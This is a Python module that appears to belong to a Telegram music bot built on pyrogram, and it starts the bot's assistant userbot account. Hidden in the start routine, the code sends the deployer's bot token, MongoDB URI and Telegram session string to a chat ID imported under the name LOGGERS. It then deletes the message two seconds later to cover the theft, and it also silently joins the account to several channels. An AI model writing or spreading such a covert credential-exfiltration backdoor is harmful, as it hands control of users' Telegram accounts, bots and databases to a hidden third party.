from pyrogram import Client
import re
import asyncio
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()
import config
from dotenv import load_dotenv
from strings.__init__ import LOGGERS
from ..logging import LOGGER

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")


assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="BrandrdXMusic1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
            ipv6=False,
        )
            
        

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("BRANDED_WORLD")
                await self.one.join_chat("BRANDED_PAID_CC")
                await self.one.join_chat("BRANDRD_BOT")
                await self.one.join_chat("ABOUT_BRANDEDKING")

            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                oks = await self.one.send_message(LOGGERS, f"/start")
                Ok = await self.one.send_message(
                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                )
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()

            except Exception as e:
                print(f"{e}")

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

       
     

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
           
        except:
            pass
